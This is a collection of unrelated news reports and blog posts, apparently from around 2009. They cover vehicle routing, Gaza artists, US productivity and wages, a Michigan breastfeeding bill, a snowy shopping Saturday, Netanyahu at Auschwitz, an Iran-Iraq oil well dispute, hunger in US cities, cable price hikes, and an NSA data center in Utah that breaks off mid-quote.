However , there are restrictions on the dates that bread can be sold at a store .
In such a case there may be dozens of breads which do not get sold or there may only be 2 .
The store may arrange to try to sell bread that is about to expire at a cheaper price the day before expiration , or it may be that if the number of breads is small it is cheaper to discard the breads than try to get them to a " soup kitchen . "
However , if the number of breads is big enough there may be a provision in the contract with the supermarket that these can be " returned . "
( The seller of the bread may have some legal way to use the outdated bread that can make the bread seller money . )
* Are there constraints on the times that deliveries or pickup can be made ?
* There may be constraints of the total length of a tour ( enough gasoline ) or the number of sites on a particular tour .
* Special types of problems involve special kinds of trucks - firetrucks , dump trucks , milk tanker trucks , gasoline trucks , school buses , dial - a- ride buses , etc .
We have just scraped the surface of the multiple layers of issues that arise .
New variants are being developed all the time ; as computers become faster , problems which were beyond the reach of solution can now be solved .
Mathematics is providing new methods and ideas for solving these new questions and making our lives richer and happier while at the same time keeping costs down and providing interesting new work within mathematics .
Keep on trucking !

While it may be no surprise that Gaza is starved of building materials and spare parts , the interior of the spotless and stylishly furnished fourth - floor flat , where Maha El - Daya lives and works , certainly is .
The walls are covered with her own ( and her artist husband 's ) paintings : haunting land and seascapes , a portrait of a child ; the living room table on which coffee is served is covered with a dark red and black cloth she hand - stitched in the pattern of a chess board , the chairs scattered with cushions decorated with her own kaleidoscopic embroidery .
Ms El - Daya 's studio and home in the northern neighbourhood of al Saftawi betrays little sign of the turbulence and bloodshed of the three - week Israeli military onslaught on Gaza which began a year ago tomorrow .
Nor does the painting she chose for the annual auction of Palestinian art organised this month in Jerusalem by the UN Development Programme ( UNDP ) , which sold for $ 900 .
At first sight , it is an abstract against a vibrant blue background but , examined more closely , it is pregnant with traditional Palestinian motifs : the feathers seamstresses attach to a needle and thread instead of a knot ; the bag containing Koranic verses once worn by women , the grain used in baking bread .
The blue is the colour of the Mediterranean ; the brown that of the desert land it laps against .
Ms El - Daya , 33 , is one of a growing , younger generation of talented painters helping to bring Gaza – and indeed Palestinian – art to the well deserved attention of a wider public .
If Gaza 's economy has ground to a standstill , its modern art appears to be flourishing .
And remarkably , the majority of the richly varied works on display in the " Colours of Hope " exhibition at the Alhambra Palace this month make little or no overt reference to last winter 's war .
In the case of Ms El - Daya , who has a daughter Salma , six , and a three - year - old son , Adam , this is n't because she was unaffected by the war ; quite the opposite .
" I could n't draw anything , " she says .
" I was living in a depression during and after the war .
I was very afraid and very worried by the bombardment and the Israelis came very near to us . "
Her husband Ayman was stranded in Egypt , where he is studying for a Master 's degree in fine arts .
The trade union headquarters near her flat was bombed .
Twenty - two members of the extended El - Daya family were killed when an Israeli F16 fighter bombarded their four - storey family apartment block in one of the worst incidents of the war – later explained by the military as an " operational error " .
Practical as well as multiply creative , and mindful that a prominent Hamas figure and potential target , Ismail Radwan , lives in her neighbourhood , Ms El - Daya painstakingly removed the glass from her windows on the first day of the bombing , replacing them as soon as the war was over .
She says she could see the white phosphorus used in the bombing of nearby Atatra , adding " We saw the ball of fire , like an octopus " .
But though her words testify to her painter 's eye , she had no inclination to commit it to canvas , seeing such immediate events as unsuitable for the lengthy task of constructing a work of art .
It was two months after the end of the war before Ms El - Daya picked up her brush again and , if her work had a theme ( though she denies it is political ) , it was that of recovery .
Her first post - war painting was of a fishing boat being repaired on the Gaza City beach .
Repeatedly , her work returns to scenes of Gaza 's coast : boats , the sea , the decay of Gaza 's old port .
One Palestinian expert has suggested that some of her beach scenes specifically evoke the siege of Gaza imposed in June 2007 after Hamas 's enforced takeover .
This Ms El - Daya rejects , saying only that " everyone can do his own translation " of the work .
She does admit , however , to wanting to record scenes that are vanishing , or threatening to , in Gaza 's ever - changing landscape .
" I want to tell the world that there was a harbour here . "
Similarly with her pastoral pictures of the now bulldozed farmland of Beit Lahiya .
" It 's not there any more , " she says .
" People are trying to get it back now but it wo n't be what it used to be . "
Ms El - Daya has much in common with her fellow painter Shareef Sarhan .
The work of both has been shown and sold as far afield as Britain and the US .
But while the paintings can travel – often thanks to diplomats – their creators , because of the closure , could not even get to this month 's show in Jerusalem .
Both have difficulty in bringing in good quality paints from Israel and the West Bank .
And both have jobs to help support their families – Ms El - Daya teaches children to draw in a programme run by the Palestinian Red Crescent and Mr Sarhan , also 33 , is a photographer for the United Nations Relief and Works Agency .
But Mr Sarhan 's painting – which fetched $ 800 at the UNDP auction – is unmistakeably of the war .
Like Ms El - Daya , he did not paint during Israel 's Operation Cast Lead ; instead he alarmed his wife and four children by photographing its impact both in the streets and , even more dangerously , from the sixth - floor roof of the family home in Gaza City 's Sabra district .
Though he sold some photographs , others he posted for free on his website , attracting 40,000 hits in the process .
It was only in the following weeks that he began to paint the series of war studies which culminated in the work for the UNDP auction .
" Sometimes the artist looks to express the events he lives through immediately , " he says .
" Sometimes it 's after a period . "
He argues that his paintings of the " aggression " , as he calls it , though informed by both his memory and the photographs he took from his roof , are essentially " from the imagination " .
But Mr Sarhan is also not , by preference , a war painter .
His entry at the 2008 UNDP auction , which sold for $ 1,100 , was a cityscape with an environmental theme , buildings packed between two trees , in which he has painted – as he often does – the grey / brown urban housing of Gaza in startlingly bright colours .
Nor has he , Ms El - Daya or the other painters represented in this month 's show , resorted for financial reasons , as some others have , to political murals and the " martyr " portraits of those killed in conflict , frequently commissioned by the armed factions .
" I 'm not angry with them ; I found a job but maybe they had no other option .
But I wo n't do it , " Mr Sarhan says .
The problem he has is finding the time to paint as much as he wants .
Not only does he need to earn his living but he is also , as a founder member of the " Windows from Gaza for Contemporary Art " group , a tireless champion of younger artists , helping to arrange two to three exhibitions a month .
There were " difficulties " at first in attracting a Gaza audience for shows including video and installation art as well as paintings .
But now , he says , 150 to 200 will routinely attend an opening .
Mr Sarhan says Hamas officials have nether intervened against nor encouraged the contemporary art movement here .
He also points out that the painting sold in last year 's UNDP auction by Ms El - Daya 's husband , Ayman Eisa , included the outline of a nude woman .
Though painted here , it almost certainly could not be exhibited in socially conservative Gaza , Hamas or no Hamas .
Accepting that there are " differences between artists and the government " he remains politically neutral .
" I am not Fatah or Hamas , " he explains .
" I am Shareef . "

PRODUCTIVITY AND COSTS
Third Quarter 2009 , Revised
In the third quarter of 2009 productivity among us nonfarm workers
increased at an 8.1 percent annual rate
, owing to a combination of " a 2.9 percent increase in output and a 4.8 percent decline in hours worked . "
In the manufacturing sector , productivity grew a whopping 13.4 percent , from a combination of an 8.4 percent increase in output and a 4.4 percent drop in hours worked .
These increases outstripped increases in payment to workers by enough to produce a drop in " unit labor costs " of 2.5 percent in nonfarm businesses and 6.1 (! ) percent in the manufacturing sector .
American workers have been producing more , in less time , and not getting raises .
In short , your boss is stealing from you .
Indeed , if the minimum wage had tracked productivity over the past 30 years , it would be $ 19 / hour .
That 's how much our bosses have been stealing from us .
Get the picture ?
They make more money off of your work and they do n't share the increased returns .
They invest money , you invest time and expertise , blood , sweat and tears , hours spent commuting and separations from your family .
They get to realize a profitable return on their investment , you get to keep treading water and waiting for a ship that probably is n't coming .
They are stealing .
From .
You .
This is what it means to have organized labor in disarray , in retreat .
This is what it means to have politicians in the pockets of the investor class , their donor classes , totally unaccountable to voters .
This is what it means when both political parties are the property of the economic aristocracy .
This is what it means when consumer debt obligations are sacrosanct , and business pension obligations are n't worth the paper they 're written on .
To paraphrase Anatole France , this is what it means when it's a crime to steal bread or sleep under a bridge , but not to crash the whole world 's economy .
It means they get to keep stealing from you , steal more over time , and can steal with impunity .
There are consequences to a lack of political power , to the working classes being too tired ( all too understandably ) to maintain civic participation , and these are them .
They get to steal from you and no one will stop them .
Could this be the famous table A ?
Or maybe
table 2 ? I do n't know , and I do n't want
to know .
I 've already got a headache .

[ If you 're on the edge of your seat for more news , please note : " The preliminary Productivity and Costs press release for fourth - quarter 2009 is scheduled to be released on Thursday , February 4 , 2010 at 8:30 a.m. ( EST ) . "
Let 's all set our watches .

" So what ? " you say .
For an answer , let me turn the floor over to one of my favorite writers , Natasha Chart , in a Campaign for America 's Future blogpost called " Your Boss Is Still Stealing From You " : Now this kind of hits home for me , because my company has been hit badly by the economic meltdown .
In my corner of the company , where we mostly publish magazines , it 's done bad things to circulation and simply ghastly things toadvertising .
I remember riding down in the elevator last fall with our advertising sales director , one of the most likable individuals you 'll ever meet , and getting an inkling of what it was like dealing even with his regular clients .
You may imagine how thrilled they were to hear from him .
Nobody had any money to spend , or much hope that things would be much better in the next quarter .
And so in my office those of us who still have jobs ( we had been through several rounds of staff slashings before the meltdown - related one ) just soldier on , hoping for better times , with fewer and fewer soldiers to do the soldiering .
In addition to the layoffs , we 've noticied that whenever one of our number finds a better job elsewhere , .
Somehow the job is supposed to get done , and indeed , by the people who are left behind .
This would correspond , as I understand it , to both conditions measured in the BLS statistics : a substantial drop in hours worked , and a notable increase in output from those of us still here .
I suppose to our bosses this proves that we were overstaffed before , if we can produce the same amount of work with so many fewer people .
Another possibility is that we 've been taken serious advantage of .
Morale is , shall we say , not good .
The feeling , I guess , is that we 're lucky to have jobs .
I have a pretty good idea that management feels this way , and thinks we should be grateful to them for preserving our jobs .
( For what it 's worth , I have n't noticed any depletion in our managerial ranks .
I wonder what their productivity stats look like . )
In fairness , given the nature of our industry , our company was under substantial pressure before the meltdown .
But the pattern with regard to labor costs seems consistent .
The staff has shrunk considerably , and raises have been out of the question , at least for the people I know about .
If I do n't like it , I guess I could quit .
With the percentage of nursing moms reportedly climbing to record highs nationwide , some Michigan lawmakers are trying to make it illegal to ask a woman to stop breast feeding her infant in a public place .
A state House bill would protect nursing mothers from discrimination under the state 's Civil Rights Act .
Rep. Robert Dean , D - Grand Rapids , said he signed on to co-sponsor the legislation after watching the care his daughter - in - law took to nurse his grandchildren as discreetly as possible .
" I know some persons yet may feel offended , but she was very careful and meticulous and the children are better for it , " Dean said .
The bill came before the House Judiciary Committee this week after being introduced by Rep. Rebekah Warren , D - Ann Arbor .
State law currently protects moms from being charged with indecent exposure if they are breast feeding in public .
But it does n't protect them from discrimination that would deny them " full and equal access to the enjoyment of goods , services , facilities , privileges , advantages and accommodations in public places , " as covered by the Civil Rights Act .
" It 's sad that it 's even needed , " said Rebeca Reyna , a 35 - year - old Ada Township resident , lactation counselor and member of the local La Leche League .
Reyna , who nursed her two children , said she hopes the legislation will raise awareness of the many health benefits of breast feeding for both mom and baby .
" I feel very strongly about encouraging mothers to breast feed in public because the more the public sees it , the more comfortable people will be , " she said .
The issue made news in 2005 when Kent County Clerk Mary Hollinrake , acting on complaints from employees and a vendor , asked a woman nursing her child in the lobby of the administration building to either cover herself , or go to a ground - floor restroom or elsewhere .
The incident galvanized protesters who later held a nursing rally on Calder Plaza to support public breast feeding .
Earlier this week at a Target store in the Detroit area , a security guard reportedly asked a mother nursing a 4 - week - old baby to leave and eventually called police .
Cascade Township resident Anna Hargrave , who is nursing her second child , said mothers need assurance they can nurse confidently without harassment .
Hargrave , 33 , said she has nursed while walking down the aisle in the grocery store , during music class , and at hockey games .
The practice has prompted a few dirty looks , but Hargrave said positive experiences outweigh the negative -- like the " thumbs up " she got from a woman shopping at Flowerland as she nursed on one of the store 's patio chairs .
" Babies should feel free to eat whenever and wherever they are hungry , " Hargrave said .
According La Leche League International , New York was the first state , in 1984 , to enact any form of breast feeding legislation .
Since then , most states have moved to protect nursing moms from indecent exposure charges .
Many have also enacted laws prohibiting discrimination against public breast feeding .
In addition to Michigan , other states that have n't covered it in their discrimination laws are Colorado , Idaho , Massachusetts , Nebraska , North Dakota , Oregon , Pennsylvania , Rhode Island , South Dakota , Virginia , Washington , the District of Columbia , and Wyoming .
Rep. Justin Amash , R - Cascade Township , cast one of the opposing votes when the bill was moved out of committee this week by a 11 - 2 vote .
Amash said he objects to including " activities , " such as public breast feeding , in the act , instead of protected classes like race , gender and national origin .
" I thought it was inappropriate ( to include in the act ) , " Amash said .
" I do n't oppose breast feeding in public .
I think employers and businesses should have open policies .
That 's not to say I would support ( another bill ) if it was done a different way . "
Hargrave said she hopes society reaches a place in which a woman breast feeding in public is not considered unusual , or private .
" I think our culture needs to recognize that that 's what breasts are for , " she said .
" If you go to a beach or a pool , you 're going to see a lot more than if a mom is nursing her child . "

So far the big storm has been a bust in New York City , although it has been intense south of here .
Cherry Hill , New Jersey , for instance , has already seen 14 inches of snowfall .
But the lack of snow does n't necessary mean that Super Saturday was salvaged for retailers .
The warnings to stay off the roads and fears of blizzard like conditions most likely scared many shoppers out of the stores .
We conducted a brief shopping trip to the Flat Iron and Union Square area today .
We found that shops were crowded although not packed to overcapacity .
It looked like it was n't quite the Super Saturday that retailers might have hoped for but not a complete wipe out either .
Here 's the full East Coast report from Stephen Manning of the Associated Press .
WASHINGTON — " Super Saturday " may just end up as Snowy Saturday in much of the eastern U.S .
The last Saturday of shopping before Christmas , usually one of the busiest days of the year for retailers , was snowed out on most of the East Coast by blizzard - like conditions that stretched from the Carolinas to New England .
Many retailers were open but crowds were sparse on a day stores count on for a successful season .
Treacherous roads and near whiteout conditions kept many shoppers away from shopping malls and other stores .
For retailers hoping for a better holiday season than last year 's dismal sales , the bad weather was especially painful .
" You are looking at your busiest day of the year and taking it away , " said Steven Aarons , manager of Barstons Child Play , a toy store in Washington .
Forecasts for the Washington region called for up to 20 inches of snow .
A heavy coat was already on the ground by the time most stores opened around midmorning .
Compounding problems were snow - covered roads and spotty public transportation .
Shopping malls were especially affected by bad roads .
In Washington , the Metro subway system shut down aboveground stations in the early afternoon , effectively cutting off rail service to many big suburban shopping centers .
In the Friendship Heights section of the city , usually a bustling retail area with big department stores and upscale shops , most foot traffic came from work crews scraping away snow and spreading salt .
Some big stores opened on time , but others remained dark after their posted opening hours .
Even the Salvation Army stand was unstaffed .
The King of Prussia Mall outside of Philadelphia opened on time at 8 a.m. , but traffic was down significantly at the complex 's 365 stores and 40 restaurants , according to a spokesman .
The mall 's traffic did get a boost Friday night from people wary of the coming storm .
The holiday shopping season so far has been mildly encouraging for retailers who have suffered due to high unemployment and the weak economy that have made consumers reluctant to spend .
Most reports put spending slightly above last year 's levels .
At Tysons Corner Center , a mega - mall in the Washington region , only about half of the stores were open by midday and customer traffic was light .
Jeff Hernandez , manager of a stationary store , said he was n't able to open until noon and would likely close before the mall shuts down later tonight .
" I did n't think it was worth it , " to stay open , he said .
It 's still unclear how the storm will affect sales later in the week and whether consumers who stayed home Saturday would shift their shopping to Sunday .
Much of the worst weather was expected to be over by late Saturday in the Washington region but last into Sunday morning farther north .
Super Saturday usually accounts for $ 15 billion worth of sales nationwide , according to Scott Bernhardt of weather research firm Planalytics .
The storm 's current track means it will likely impact about a quarter of the U.S. population .
Those that do shop will likely make their trips short , he said .
" They are going to dash in and dash out .
They are n't going to do any impulse buying , " he said .
Retailers with an especially high concentration of stores in the affected region include Bon-Ton stores , DSW Shoe Warehouse and Kohl 's Inc .
The effect on retailers is likely to be less than it would if the snow hit even later in the season , said Michael Niemira , chief economist of the International Council of Shopping Centers .
They still have several days to make up the sales .
And while the storm hit the heavily populated East Coast , most of the rest of the nation was unaffected by bad weather .
The storm did n't lead Niemira to change his estimate that November and December spending would rise 1 percent from last year .
Online shopping also could get a boost as consumers buy from home rather than brave the bad weather .
" People may just sit at home and shop , " said Hana Ben-Shabat , a partner in the retail practice at A.T. Kearney , a global management consultant .
In New York , shoppers were trying to wrap up ahead of the storm .
At Manhattan Mall , a few blocks away from Macy 's flagship store in New York , stores like J.C.
Penney were still bustling at midday , when snow had n't yet materialized .
But even shoppers who took the train in to the city were wary .
Natalie McCann , of Edison , N.J. , said she would probably cut short her annual trip into the city on the last Saturday because of the building storm .
But it was n't the snow that was keeping her from spending big on gifts .
" I 'm just not that enthusiastic this year , " said McCann , 47 , who says she 's cutting her spending significantly to about $ 750 .
In a much - anticipatedspeech at Auschwitz - Birkenau marking International HolocaustMemorial Day Wednesday , Prime Minister Binyamin Netanyahu reassertedthe right of the Jewish people to self - defense amid increasingconcern over the Iranian threat and growing controversy abroad overthe legitimacy of Israel and its military .
“ From the cursedground at Auschwitz , Birkenau and other camps rise the voices of ourbrothers and sisters , our people who choked to death and were burnedand murdered , ” said the prime minister , in English , wishing “ decency , truthand hope ... for all mankind ” before switching to Hebrew , “ thelanguage the Nazis sought to exterminate . ”
“ Remember what Amalek did to you , ” cautioned Netanyahu , quoting a particularlyominous passage from Deuteronomy .
“ I have come here today fromJerusalem to tell you :
We will never forget .
We will not allow the Holocaust deniers or those who desecrate [ Jewish ] graves and signs toerase or distort [ our ] memory . ”
The prime ministeralso warned that though the “ Nazi Amalek ” was almost entirely aghost of the past , “ a new Amalek is appearing and once againthreatening to annihilate the Jews .
We will not allow it ...
We willnever forget and always stand guard , ” he said .
“ Murderoushatred must be stopped in its tracks , stopped right from thebeginning .
All countries in the world must learn this lesson , just aswe did after losing a third of our people in blood - soaked Europe .
Welearned that the only guarantee for the protection of our people isthe State of Israel and its army , the IDF , ” Netanyahu declared , warning that never again would the existence of Israel and the Jewishpeople be threatened .
Israel , he said , must stand at the forefront of all civilized nations andwarn them about impending danger – while also preparing to defenditself against all threats .
“ I promise , as head of the Jewishstate , that never again will we allow the hand of evil to sever thelife of our people and our state , ” he solemnly added .
Netanyahu chose not to specifically refer to the Iranian regime and its nuclear drive , but has drawn a link between the Nazis and the Iranian threat to the Jews in many recent speeches .
“ AmYisrael Chai , we have returned to our homeland , to the land ofour forefathers , to Jerusalem , our capital .
We have converged fromall corners of the world , Holocaust survivors , Arab Jews , Jews fromformer Soviet Union states , Ethiopian Jews , ” Netanyahu said , choosing frosty Poland as the location for his rebuke to those whoclaim the Jewish population of Israel is comprised mostly ofemigrants from Europe . , we have returned to our homeland , to the land ofour forefathers , to Jerusalem , our capital .

AMARA , Iraq ( Reuters ) - Iraqi and Iranian forces are dug in on either side of a disputed inactive oil well in the sensitive border area , with Iraqis vowing to fight if necessary to fend off another occupation of the well by Iranian soldiers .

Iraqi troops say they will defend the well , where Iranian troops raised a flag for several days this month .
It is unclear how many troops are involved in the stand - off , but as many as 30 lightly armed Iraqi troops usually occupy border outposts in sensitive areas , and up to 10 in other areas .
Some 11 Iranian soldiers are stationed near the disputed well .
The seizure of the well , which Iraq says is part of its Fakka oilfield in southeast Maysan province , triggered protests from the government in Baghdad and caused a rise in prices on jittery world oil markets .
The Iranian forces have since pulled back , but Iraq says they are still on its territory , stirring echoes of the border dispute that led to the eight - year Iran - Iraq war in the 1980s , in which about 1 million people died .
“ These wells in the Fakka region are Iraqi , and we will defend them to the last drop of blood , ” said Brigadier - General Razak Abdul Hassan of the Iraqi border guards at Fakka .
The Iranians are 100 meters inside Iraqi territory , he said , some 80 meters from the disputed well .
Iraqi troops watch from nearby , and both sides appear to be hunkered down behind earth walls at their bleak desert outposts .
EXTRA FORCES
Hassan said Iraq has deployed extra forces to other wells nearby , but declined to outline numbers .
The well , which has only been operative briefly in the 1970s , now sits in an effective no man ’s land as a binational committee prepares to begin work early next year demarcating the border in the oil - producing border region .
“ After that the word will be very clear and precise .
We expect and know the result is that the well is Iraqi , and the Iranians will admit this , ” said Ali Maarij , head of Iraq ’s state Maysan Oil Co. , in charge of Fakka and surrounding fields .
Well No. 4 was drilled in 1979 and produced about 3,000 barrels a day , a small amount for a region that is home to some to the world ’s largest oil reserves .
The well went offline in 1980 due to the Iran - Iraq war , and has been inactive since .
Yet the symbolism of the brief Iranian occupation was more serious .
Fakka is part of the Maysan oilfield complex , with reserves of 2.5 billion barrels , which Iraq tried unsuccessfully to auction off to foreign oil firms this year .
The mere threat of future incursions or border feuds puts more risk onto the 10 oilfield deals the Iraqi government did secure this year , some of which are near the Iran - Iraq border .
Oil firms are already jittery about working in a country just emerging from years of bloodshed after the 2003 U.S. invasion , and where bombings and shootings are still common .
The occupation was also damaging for Iraq ’s Prime Minister Nuri al - Maliki , whose party is contesting March 7 national polls .
His government ’s response to the dispute was relatively muted , and Iranian troops faced no apparent military resistance .
Iran -Iraq ties have warmed since the ouster of Sunni Arab Saddam Hussein in 2003 .
Many in Iraq ’s new Shi’ite leadership took refuge in majority Shi’ite Iran during Saddam ’s reign .
But relations have been strained by accusations of Iranian interference in Iraq and by Tehran ’s opposition to the presence of U.S. troops .
Being seen as close to Iran has become a liability for Iraqi politicians ahead of the general election .
“ We are determined and persistent in the defense of our border .
We will not give up even an inch .
We are confident and able ... and ready for any action at any time , ” said Major General Habib al - Husseini , head of Maysan security operations .
CHICAGO ( Reuters ) - Hunger is spreading while the number of homeless families is increasing as a result of the recession and other factors , according to a report on Tuesday .

The U.S. Conference of Mayors said cities reported a 26 percent jump in demand for hunger assistance over the past year , the largest average increase since 1991 .
Middle - class families as well as the uninsured , elderly , working poor and homeless increasingly looked for help with hunger , which was mainly fueled by unemployment , high housing costs and low wages .
The 2009 report is based on a survey of 27 cities , including Boston , Chicago , Detroit , Los Angeles , Miami , Philadelphia and San Francisco , that comprise the group ’s task force on hunger and homelessness .
Looking ahead to 2010 , cities said they expect it will be difficult to meet increased demands for food due to the impact of state and local budget cuts , a decrease in grocery store donations and higher food costs .
Just over three - fourths of the cities reported a jump in homeless families due to the recession and lack of affordable housing .
Individual homelessness , on the other hand , was level or down in 16 of the cities .
“ This is an indication of the success of policies aimed at ending chronic homelessness among single adults with disabilities , ” the report said .
Only 10 cities reported having so - called tent cities or other concentrations of the homeless .
Most of the cities in the survey received additional funding to combat hunger and homelessness from the American Recovery and Reinvestment Act .
“ Cities are using ( housing funds ) to develop central intake systems for homeless services , coordinate services more closely with surrounding areas , or offer homeless prevention assistance for the first time , ” the report said .
Both Time Warner Cable and DirecTV are jacking their prices up , passing along higher channel rates to the customer .
My , what a nice reminder this is that you really do n't need to be paying for cable !

Yes , a late deal was struck between Fox and Time Warner Cable , but that deal involves Time Warner paying Fox more for the right to carry its stations .
And guess who 's paying for those rates ?
You are , sucker .

Meanwhile , the Food Network and HGTV are currently being blacked out for Cablevision customers while a similar dispute is going on .
It will probably be resolved the same way : with higher costs for consumers .
Oh , and did I mention that DirecTV is increasing both its costs for basic service as well as for DVRs ?

Yes , it 's getting ugly out there , folks .
Or more ugly , I should say .
Networks are threatened by cable , so they want more money to run on cable .
Meanwhile , cable networks are getting more and more viewers and clout , so they want more money too .
And in the middle are cable and satellite companies , who have no plans of giving up any of their profits to these bitchy networks .
So that leaves you , the customer , holding the bill .
Luckily , it 's never been easier to cut these guys loose , save yourself $ 100 / month and never look back .
Why not send them all a message ?
These guys just are n't as essential as they think they are .

" By the very nature of the intelligence business , it is difficult to discuss much of the NSA mission . " — National Security Agency Web site
In this post - Sept. 11 world , plans by the National Security Agency to construct a colossal $ 1.9 billion information storage center at Camp Williams could be considered a power trip .
But it 's not the sort of power trip that keeps civil libertarians lying awake at night .
No , this power grab is for the stuff of Thomas Edison and Nikola Tesla — the juice needed to keep acres of NSA supercomputers humming and a cyber eye peeled for the world 's bad guys .
Nearly a decade into the new millennium , America 's spy agency is power gridlocked at its sprawling Fort Meade , Md. , headquarters .
The NSA , which devours electricity the same way teenage boys wolf down french fries at McDonald's , has been forced to look elsewhere to feed its ravenous AC / DC appetite .
" At the NSA , electrical power is political power .
In its top - secret world , the coin of the realm is the kilowatt , " writes national security authority and author James Bamford .
It 's a simple equation : More data coming in means more reports going out .
More reports going out means more political clout for the agency , Bamford writes .
Intelligence historian and author Matthew M. Aid considers the NSA 's quest for power a driving factor in the NSA 's selection of Camp Williams , which covers 28,000 acres bordering Utah and Salt Lake counties .
During an Oct. 23 news conference at the state Capitol officially announcing the new spy center , Glenn Gaffney , deputy director of national intelligence for collection , said as much when he confirmed that one of the strengths of the Utah location was that it " offered an abundant availability of low - cost power . "
There 's been some speculation that the Camp Williams facility dovetails with the NSA 's controversial attempts to further establish itself as the lead dog for the government 's expanding cybersecurity initiatives , although NSA officials are n't tipping their hand .
" I can't get into some of the specific details of the kind of work that will go on at the center because it is a critical aspect of the way we are looking at doing cybersecurity going forward , " Gaffney said in his best NSA - ese .
" I can say that the reason why we are doing the center is because of the deep level of technical expertise that 's needed to understand the nature of the threats . "
Given the NSA 's penchant for speaking little and revealing less , it sounds like he 's saying , " Trust us . "
Zeros gone wild
The virtual mountains of data needing such huge levels of power to mine can be brain - numbing .
Think zeros gone wild .
A 2008 report by the MITRE Corp. , prepared for the Department of Defense , conservatively estimates that the high volumes of data storage required for NSA eavesdropping will reach the petabyte level by 2015 .
A petabyte is one quadrillion bytes ( 1,000,000,000,000,000 ) .
There has been even wilder speculation that data storage may reach the yottabyte level within that same time frame .
A yottabyte , the largest unit of measure for computer data , equals 1,000,000,000,000,000,000,000,000 bytes .
Either way , the NSA is already drowning in information .
The agency 's former director , Lt. Gen. Michael V. Hayden , admitted the NSA " is collecting far more data than it processes , and that the agency processes more data than it actually reports to its consumers . "
In his book " The Shadow Factory , " Bamford cites an already outdated study by the University of California at Berkeley that measured global data trends .
In 2002 , there were 1.1 billion telephone lines in the world carrying nearly 3.8 billion minutes — approximately 15 exabytes of data .
An exabyte is 1,000 petabytes .
Cell phones added 2.3 exabytes of data , while the Internet that year added another 32 petabytes to the bubbling information pot .
Suffice it to say that seven years hence , it 's grown to a tsunami - size information wave that 's being added to daily , which is where the NSA 's robust sifting technologies of today and the future come into play .
" Once vacuumed up and stored in these near - infinite ' libraries , ' the data are then analyzed by powerful info weapons , supercomputers running complex algorithmic programs , to determine who among us may be — or may one day become — a terrorist , " Bamford writes .
" In the NSA 's world of automated surveillance on steroids , every bit has a history , and every keystroke tells a story . "
Bigger Brother , if you will , once only found in literature and the lexicon , has now taken up full - time residency in our daily lives .
Power shortage
The Baltimore Sun first reported in 2006 that the NSA was unable to install new supercomputers and other sophisticated equipment at Fort Meade for fear of " blowing out the electrical infrastructure . "
The NSA and Fort Meade are Baltimore Gas & Electric 's largest customers , consuming roughly the amount of power that the city of Annapolis does , the Sun reported .
In 2005 , the NSA took its first step to decentralize information gathering and storage by making known it would convert a former 470,000 - square - foot Sony computer - chip building in San Antonio , Texas , into a satellite data facility .
The Texas Cryptologic Center , as it's being called , reportedly rivals the nearby Alamodome in size .
Camp Williams was announced to be the next such NSA facility , although back - channel chatter is now questioning if San Antonio is being shoved aside in favor of increasing the Utah center 's role .
" I 've heard the San Antonio deal is dead , " said someone who closely follows the NSA but asked not to be identified .
" I was told that given current budgetary constraints that the NSA was basically told they could have one , but not both centers , and it looks like they 've chosen Utah . "
Should that be the case , no one apparently has told the NSA , which would be ironic for an agency that prides itself on knowing everything .
" Plans for the NSA Texas Cryptologic Center are continuing , " wrote NSA public affairs specialist Marci Green in a recent e-mail .
" ( The ) NSA has maintained a presence in San Antonio over the past two decades and plans to continue to have strong presence in the area . "
Hiding in plain sight
A long - running joke has been that NSA actually stands for " No Such Agency . "
But lurking in the shadows becomes trickier when you 've grown into the 5,000 - pound gorilla .
Thus , as the scope of the NSA increases , the agency is continually perfecting its ability to hide in plain sight by labeling much of what does " classified " and creating a nearly impenetrable veil of secrecy .
But maintaining that concealment breeds fear and paranoia , especially among conspiracy theorists and the similar - minded .
Much of the Web buzz surrounding the Utah data center has revolved around how banks of supercomputers inside the facility might be used for intrusive data mining and monitoring of telephone conversations , e-mails and Web site hits , in the name of national security .
" While the NSA does n't engage in traditional wiretapping , which is the bailiwick of the FBI and other enforcement agencies , it does collect signals intelligence ( sigint ) by intercepting streams of foreign electronic communications containing millions and millions of telephone calls and e-mails , " writes Bamford .
The NSA feeds intercepts through its computers that screen for selected names , telephone numbers , Internet addresses and trigger words or phrases .
Flagged information gets highlighted for further analysis .
" Foreign " is the keyword here .
Domestic signals intelligence is not part of the NSA 's charge , although there is plenty of overlap , requiring the agency to navigate shades of gray .
Whenever the NSA has blurred the demarcation between monitoring foreign and domestic signals , however — most famously several years ago , when the agency was reportedly electronically peeking over the shoulder of American servicemen , journalists and aid workers overseas — rebuke by civil libertarians has followed like the period at the end of a sentence .
By the book
Try as it might , the NSA can't shake those Orwellian overtones , prompting Gaffney and others to reiterate that everything in Utah will be done by the book .
" ( We ) will accomplish this in full compliance with the U.S. Constitution and federal law and while observing strict guidelines that protect the privacy and civil liberties of the American people , " Gaffney pledged in October .
Perhaps it 's because Utahns are such a family - oriented bunch that few even blinked upon learning their Big Brother was moving in .
Not that the NSA 's actual physical location matters any more , says Aid , who researched and penned " The Secret Sentry : The Untold History of the National Security Agency . "
To be frank , he said , the NSA has moved beyond Big Brother .
" I 've been following the NSA for 25 years , and while I admire ( the agency 's ) successes and the commitment of the people working there , there 's a lot that also gives me pause for concern .
We should be wary of too much secrecy , " cautions the archivist , who himself was a controversial footnote in NSA history nearly a quarter of a century ago .
While serving as an Air Force sergeant and Russian linguist for the NSA in England , Aid was court - martialed , imprisoned for just over a year and received a bad - conduct discharge for unauthorized possession of classified information and impersonating an officer , according to Air Force documents reported by the Washington Post in August 2006 .
When it comes to having a healthy skepticism of how the NSA sometimes conducts its business , Aid is not alone .
Acknowledgement by government officials that the agency went beyond the broad limits set by Congress last year for intercepting telephone and e-mail messages of Americans has raised the hackles of many NSA watchdogs .
" The NSA 's expertise , which is impressive and very , very deep , is focused primarily on the needs of the military and the intelligence community , " said Matt Blaze , a computer security expert at the University of Pennsylvania .
But Blaze told the New York Times that the NSA 's " track record in dealing with civilian communications security is mixed , at best . "
Sitting rack
Aid doubts the NSA will use Camp Williams for domestic prying .
Rather , he's of the opinion the data center will significantly expand on the linguistics and electronic surveillance work already being carried out there .
" It 's an operational mission that 's been going on ( there ) for some time , " Aid said , describing the setting inside a windowless operations building filled with linguists wearing headphones and dressed in desert fatigues .
" The NSA is a windowless world , " Aid laughs , claiming he can spot an agency installation anywhere because there are never any windows .
They 're either built windowless , or if it 's a retrofit , they cover them over .
Aid said soldiers " sit rack , " as it 's termed , behind a computer with radio intercept receivers and recorders monitoring live missions beamed remotely by satellite from Iraq and Afghanistan .
" We ( the Utah National Guard ) do n't do that at Camp Williams , " clarified spokesman Lt. Col .
